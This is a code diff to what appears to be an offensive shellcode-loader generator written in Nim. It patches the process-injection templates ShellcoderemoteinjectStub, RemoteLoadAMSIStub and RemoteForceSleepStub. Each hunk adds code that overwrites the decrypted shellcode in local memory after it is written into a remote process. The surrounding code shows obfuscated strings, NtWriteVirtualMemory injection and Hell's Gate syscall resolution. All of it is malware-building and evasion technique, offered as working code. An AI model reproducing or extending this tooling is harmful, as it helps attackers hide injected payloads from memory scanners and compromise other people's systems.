@@ -311,6 +311,14 @@ let ShellcoderemoteinjectStub * = """
                     echo obf("[*] NtWriteProcessMemory: "), toHex(status)
                     echo obf("    \\-- bytes written: "), bytesWritten
                     echo obf("")
+                
+                when defined(verbose):
+                    echo obf("[*] Going to clean local memory of decrypted shellcode")
+                # ptrDecText has to be overwritten with 0 for friendlycode.len bytes
+                var zeroSeq: seq[byte] = newSeq[byte](friendlycode.len)
+                moveMemory(ptrDecText, addr zeroSeq[0], friendlycode.len)
+                when defined(verbose):
+                    echo obf("[*] Done.")
             
             when defined(JmpEntry):
                 var newEntry: LPVOID
@@ -539,6 +547,15 @@ let ShellcoderemoteinjectStub * = """
                     echo obf("    \\-- bytes written: "), bytesWritten
                     echo obf("")
                 
+                when defined(verbose):
+                    echo obf("[*] Going to clean local memory of decrypted shellcode")
+                # ptrDecText has to be overwritten with 0 for friendlycode.len bytes
+                var zeroSeq: seq[byte] = newSeq[byte](friendlycode.len)
+                moveMemory(ptrDecText, addr zeroSeq[0], friendlycode.len)
+                when defined(verbose):
+                    echo obf("[*] Done.")
+
+
                 when defined(logFile):
                     logVerbose(obf("[*] NtWriteVirtualMemory: ") & cast[string](toHex(status)) & "\r\n")
                     logVerbose(obf("    \\-- bytes written: ") & cast[string](bytesWritten) & "\r\n")
@@ -1653,6 +1670,14 @@ let RemoteLoadAMSIStub* = """
                 echo obf("    \\-- bytes written: "), bytesWritten
                 echo obf("")
             
+            when defined(verbose):
+                echo obf("[*] Going to clean local memory of decrypted shellcode")
+            # ptrDecText has to be overwritten with 0 for friendlycode.len bytes
+            var zeroSeq: seq[byte] = newSeq[byte](friendlycode.len)
+            moveMemory(ptrDecText, addr zeroSeq[0], friendlycode.len)
+            when defined(verbose):
+                echo obf("[*] Done.")
+            
             when defined(Hellsgate):
                 if getSyscall(ntProtectTable):
                     syscall = ntProtectTable.wSysCall
@@ -1966,6 +1991,14 @@ let RemoteForceSleepStub* = """
                 echo obf("    \\-- bytes written: "), bytesWritten
                 echo obf("")
             
+            when defined(verbose):
+                echo obf("[*] Going to clean local memory of decrypted shellcode")
+            # ptrDecText has to be overwritten with 0 for friendlycode.len bytes
+            var zeroSeq: seq[byte] = newSeq[byte](friendlycode.len)
+            moveMemory(ptrDecText, addr zeroSeq[0], friendlycode.len)
+            when defined(verbose):
+                echo obf("[*] Done.")
+
             when defined(Hellsgate):
                 if getSyscall(ntProtectTable):
                     syscall = ntProtectTable.wSysCall
